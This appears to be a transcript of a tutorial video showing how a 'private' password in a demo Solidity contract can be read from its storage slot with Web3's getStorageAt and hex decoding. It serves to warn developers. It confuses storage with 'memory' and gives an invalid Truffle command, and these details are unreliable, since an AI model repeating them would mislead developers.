
### Memory Forensics in Ethereum Smart Contracts

**Hi everyone!** In this quick video, I'm going to show you how to perform memory forensics on Ethereum (EVM) smart contracts and how to extract credentials and sensitive information from a deployed smart contract on the blockchain. Let's dive in!

#### Minimalistic Solidity Contract

To represent the concept, I've created a minimalistic contract. This contract, which I'll call `Accounts` (or any name, it doesn't really matter), serves to illustrate the idea.

```solidity
pragma solidity ^0.8.0;

contract Accounts {
    uint public pinCode = 9878;      // Public pin code
    uint public accountId = 1234;    // Public account ID
    bytes32 private password = "aabbcc"; // Private password
}
```

- **Pin Code**: Visible to everyone.
- **Account ID**: Visible to everyone.
- **Password**: Intended to be private but can be exploited.

#### Performing Forensics on a Deployed Contract

1. **Smart Contracts and Memory:**
    - The EVM is a stack-based machine with its own memory space.
    - Memory can be thought of as arrays with indices starting at 0.
    - Local state variables are stored in these memory slots.

2. **Memory Slots and Storage:**
    - Each `uint` (256 bits) takes up exactly one slot (32 bytes).
    - For the example contract:
        - `pinCode` is stored in slot 0.
        - `accountId` is stored in slot 1.
        - `password` (bytes32) is stored in slot 2.

#### Exploiting the Vulnerability

Even though the `password` is marked private, it is still stored in a memory slot that can be accessed. This is a common misconception among developers.

**Steps to Exploit:**

1. **Deploy the Contract on Ropsten:**
    - The vulnerable contract is already deployed on Ropsten. 

2. **Use Truffle and Web3 to Inspect Memory:**

    - **Setup Truffle:**
        ```bash
        truffle consume network ropsten
        ```

    - **Using Web3 to Access Storage:**
        ```javascript
        const Web3 = require('web3');
        const web3 = new Web3('https://ropsten.infura.io/v3/YOUR_INFURA_PROJECT_ID');

        const contractAddress = '0xYourContractAddress';
        web3.eth.getStorageAt(contractAddress, 2, (err, data) => {
            console.log(data);
        });
        ```

3. **Interpreting the Output:**
    - The output will be in hexadecimal format.
    - Convert this hexadecimal value to ASCII to reveal the stored password.

    **Example Conversion:**
    - Suppose the output is `0x6161626263630000000000000000000000000000000000000000000000000000`.
    - This represents the ASCII string `aabbcc`.

#### Summary

- **Smart Contracts**: Even private variables are stored in the EVM memory and can be accessed.
- **Security**: Developers should be aware that marking a variable as `private` does not mean it is hidden from external access.

